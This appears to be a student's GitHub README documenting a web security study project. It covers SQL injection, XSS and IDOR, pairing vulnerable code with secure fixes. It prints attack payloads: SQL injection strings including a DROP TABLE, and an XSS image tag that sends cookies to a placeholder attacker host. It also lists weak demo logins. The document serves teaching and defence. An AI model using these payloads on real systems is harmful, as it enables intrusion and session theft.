# 🛡️ Web Security Learning Project

> A practical study of common web vulnerabilities, OWASP Top 10, and secure coding principles — conducted in safe, legal testing environments.

---

## 📌 Project Overview

This project documents my hands-on learning journey through **web application security**. Using dedicated testing platforms and intentionally vulnerable applications, I explored how attackers exploit common vulnerabilities and how to build secure, resilient applications.

The repository contains:
- **app.py**: Interactive Flask web app demonstrating vulnerable vs. secure code
- **vulnerability_examples.py**: Standalone Python examples of 6 major vulnerability categories
- **config.py**: Centralized configuration with security best practices
- **requirements.txt**: Python dependencies

---

## 🛠️ Tools & Environments Used

| Tool / Platform | Purpose |
|----------------|----------|
| **DVWA** (Damn Vulnerable Web App) | Practicing SQL Injection, XSS, and more |
| **OWASP WebGoat** | Guided web security lessons |
| **Burp Suite Community** | Intercepting and analyzing HTTP requests |
| **Browser Dev Tools** | Inspecting client-side behavior |
| **TryHackMe / HackTheBox** | Guided CTF-style web challenges |

---

## 🎯 Objectives

- Understand and exploit common web vulnerabilities in safe environments
- Study all **OWASP Top 10** vulnerability categories
- Learn how to identify vulnerable code and write secure alternatives
- Build a foundation for ethical hacking and secure software development

---

## 🔟 OWASP Top 10 — Studied Vulnerabilities

| # | Vulnerability | Status |
|---|--------------|--------|
| A01 | Broken Access Control | ✅ Studied |
| A02 | Cryptographic Failures | ✅ Studied |
| A03 | Injection (SQLi, Command Injection) | ✅ Practiced |
| A04 | Insecure Design | ✅ Studied |
| A05 | Security Misconfiguration | ✅ Studied |
| A06 | Vulnerable & Outdated Components | ✅ Studied |
| A07 | Identification & Authentication Failures | ✅ Studied |
| A08 | Software & Data Integrity Failures | ✅ Studied |
| A09 | Security Logging & Monitoring Failures | ✅ Studied |
| A10 | Server-Side Request Forgery (SSRF) | ✅ Studied |

---

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone https://github.com/sachin-yadav-06/Web-Security-Learning-Project.git
cd Web-Security-Learning-Project

# Create virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

### Running the Flask App

```bash
# Run the interactive demo
python app.py

# Open in browser: http://127.0.0.1:5000
# Login credentials:
#   - admin / admin123
#   - sachin / password1
#   - user / user1234
```

### Running Vulnerability Examples

```bash
# Run standalone vulnerability demonstrations
python vulnerability_examples.py
```

---

## 💉 SQL Injection (SQLi)

### What It Is
SQL Injection occurs when user input is inserted directly into a SQL query without proper sanitization, allowing attackers to manipulate database queries.

### Example — Vulnerable Code (Python)
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cur.execute(query)
```

### Attack Payload
```sql
' OR '1'='1' --
' UNION SELECT username, password FROM users --
' DROP TABLE users; --
```

### Secure Code (Parameterized Query)
```python
# ✅ SECURE — Using prepared statements
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cur.execute(query, (username, password))
```

### Key Takeaways
- **Never** concatenate user input directly into SQL queries
- Always use **prepared statements** or **parameterized queries**
- Use an **ORM** (e.g., SQLAlchemy, Hibernate) when possible
- Apply **least privilege** — DB users should only have necessary permissions

---

## 🖊️ Cross-Site Scripting (XSS)

### What It Is
XSS allows attackers to inject malicious client-side scripts into web pages viewed by other users.

### Types Practiced

| Type | Description |
|------|-------------|
| **Stored XSS** | Malicious script saved in DB and served to all users |
| **Reflected XSS** | Script reflected off server in a response |
| **DOM-based XSS** | Exploit in client-side JavaScript directly |

### Example — Vulnerable Code
```html
<!-- ❌ VULNERABLE — directly inserting user input -->
<p>Welcome, {{ user_input | safe }}</p>
```

### Attack Payload
```html
<script>alert('XSS')</script>
<img src=x onerror="document.location='http://attacker.com/steal?c='+document.cookie">
```

### Secure Code
```python
# ✅ SECURE — HTML encoding output
safe_input = html.escape(user_input)
# Then render in template without | safe filter
<p>Welcome, {{ safe_input }}</p>
```

### Key Takeaways
- Always **encode output** before rendering user data in HTML
- Use a **Content Security Policy (CSP)** header
- Sanitize input using libraries like **DOMPurify** (client-side)
- Set **HttpOnly** and **Secure** flags on cookies

---

## 🚪 Broken Access Control (IDOR)

### What It Is
Users can act outside of their intended permissions — accessing other users' data or admin functions.

### Example
```
# Normal user accessing their profile
GET /user/profile?id=1001

# Attacker changes ID to access another user's data (IDOR)
GET /user/profile?id=1002
```

### Prevention
- Enforce access control checks **server-side** on every request
- Use indirect object references or validate ownership
- Deny by default — only allow what is explicitly permitted
- Always verify the logged-in user owns the resource they're accessing

---

## 🔐 Secure Coding Principles Learned

| Principle | Description |
|-----------|-------------|
| **Input Validation** | Validate all input on the server side |
| **Output Encoding** | Encode data before rendering in HTML/JS/SQL |
| **Least Privilege** | Grant only the minimum permissions needed |
| **Defense in Depth** | Layer multiple security controls |
| **Fail Securely** | Handle errors without leaking sensitive info |
| **Security Headers** | CSP, X-Frame-Options, HSTS, etc. |
| **Authentication** | Strong passwords, MFA, secure session handling |
| **Password Storage** | Use bcrypt/argon2 with per-user salt |

---

## 📁 Repository Structure

```
web-security-project/
│
├── README.md                    # Project documentation (this file)
├── app.py                       # Flask web app with vulnerable & secure demos
├── vulnerability_examples.py    # Standalone vulnerability examples
├── config.py                    # Configuration file with security settings
├── requirements.txt             # Python dependencies
├── .gitignore                   # Git ignore file
├── .env.example                 # Environment configuration template
└── demo.db                      # SQLite database (auto-created, gitignored)
```

---

## 🧠 What I Learned

- How the most common web attacks work at a technical level
- The mindset shift between **developer** (build features) and **security researcher** (break features)
- Why input validation alone is not sufficient — output encoding matters equally
- How a single vulnerability can chain into a full compromise
- The value of the **OWASP Top 10** as a developer security checklist
- The importance of **server-side validation and authorization checks**
- Why **parameterized queries** prevent SQL injection
- How **HTML encoding** stops XSS attacks
- The critical role of **per-user salt** in password hashing

---

## 🔒 Security Features Implemented

✅ Parameterized SQL queries  
✅ HTML output encoding  
✅ Per-user password salt  
✅ Secure session management  
✅ Server-side authorization checks (IDOR prevention)  
✅ Security HTTP headers (CSP, X-Frame-Options, HSTS, etc.)  
✅ Session cookie flags (HttpOnly, Secure, SameSite)  
✅ Input validation and error handling  
✅ Environment-based configuration  
✅ Login/logout system  

---

## ⚖️ Legal & Ethical Disclaimer

> All vulnerability practice was performed **exclusively** on intentionally vulnerable applications (DVWA, WebGoat) and authorized CTF platforms (TryHackMe, HackTheBox). **No real-world systems, networks, or applications were tested without explicit permission.**
>
> This project is for **educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain written permission before testing security on any system you don't own.

---

## 🛡️ Production Security Recommendations

This project is for learning. Before deploying to production:

1. **Use bcrypt or argon2** instead of SHA-256 for password hashing
2. **Enable HTTPS/TLS** for all communications
3. **Implement MFA** (multi-factor authentication)
4. **Add rate limiting** to prevent brute force attacks
5. **Use security headers** (already implemented in config.py)
6. **Implement CSRF protection** with tokens
7. **Add comprehensive logging and monitoring**
8. **Keep dependencies updated** (use `pip list --outdated`)
9. **Use a Web Application Firewall (WAF)**
10. **Conduct regular security audits and penetration testing**

---

## 📚 References & Resources

- [OWASP Top 10 Official](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) *(Free, highly recommended)*
- [DVWA — Damn Vulnerable Web App](https://github.com/digininja/DVWA)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [TryHackMe — Web Fundamentals Path](https://tryhackme.com/path/outline/web)
- [HackTheBox — Web Challenges](https://www.hackthebox.com/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

---

## 👤 Author

**Sachin Kumar**  
Cybersecurity Enthusiast | BCA/B.Sc. Student  
📧 sachinyadav2063@gmail.com  
🔗 [GitHub](https://github.com/sachin-yadav-06) | [LinkedIn](https://linkedin.com)

---

## 📝 License

This project is provided as-is for educational purposes. Use responsibly and legally.

---

⭐ *If you found this helpful, feel free to star the repo!*
